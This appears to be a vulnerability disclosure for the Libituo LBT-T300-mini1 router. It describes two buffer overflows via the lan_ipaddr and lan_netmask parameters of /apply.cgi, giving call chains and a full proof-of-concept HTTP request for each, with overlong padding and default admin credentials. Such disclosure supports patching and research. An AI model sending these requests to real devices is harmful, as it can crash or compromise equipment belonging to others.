# LBT-T300-mini1 Buffer Overflow
**Vulnerability description**
Shenzhen Libituo Technology Co., Ltd LBT-T300-mini1 v1.2.9 was discovered to contain two buffer overflows via multiple  parameters at /apply.cgi.

## 1.lan_ipaddr

### Vulnerability analysis
Due to the lack of data length restrictions of the lan_ipaddr parameter, a buffer overflow vulnerability is created.

function call chain

Main()->sub_40C564()->start_single_service()->start_workmode()->start_lan().
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/dd74dbb3-a048-4f30-b4bd-e3f697f772ec)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/9305c851-eea6-4a2e-a668-3fd07fe1fcb3)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/4dc3dca9-8290-4788-a68d-dbd2e8967e5a)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/9c3db57b-1e4a-412a-bbcf-fdd58195cd54)




> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 697
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/LAN_DHCPS_AP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=LAN_DHCPS_AP&change_action=&action=Apply&lan_ipaddr=192.168.10.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&LAN_DHCPS_AP=NONE&dhcp_server_enable=1&lan_netmask=255.255.255.0&dhcp_start=192.168.10.1&dhcp_end=192.168.10.115&dhcp_lease=999

```

## 2.lan_netmask
### Vulnerability analysis
Due to the lack of data length restrictions of the lan_netmask parameter, a buffer overflow vulnerability is created.

function call chain

Main()->sub_40C564()->start_single_service()->start_workmode()->start_lan().
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/e9e09db1-3a0a-410b-93b7-60164e49039a)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/9305c851-eea6-4a2e-a668-3fd07fe1fcb3)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/4dc3dca9-8290-4788-a68d-dbd2e8967e5a)
![image](https://github.com/AdamRitz/lbtvul/assets/95133035/9c3db57b-1e4a-412a-bbcf-fdd58195cd54)


> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 697
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/LAN_DHCPS_AP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=LAN_DHCPS_AP&change_action=&action=Apply&lan_ipaddr=192.168.10.0&LAN_DHCPS_AP=NONE&dhcp_server_enable=1&lan_netmask=255.255.255.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&dhcp_start=192.168.10.1&dhcp_end=192.168.10.115&dhcp_lease=999

```
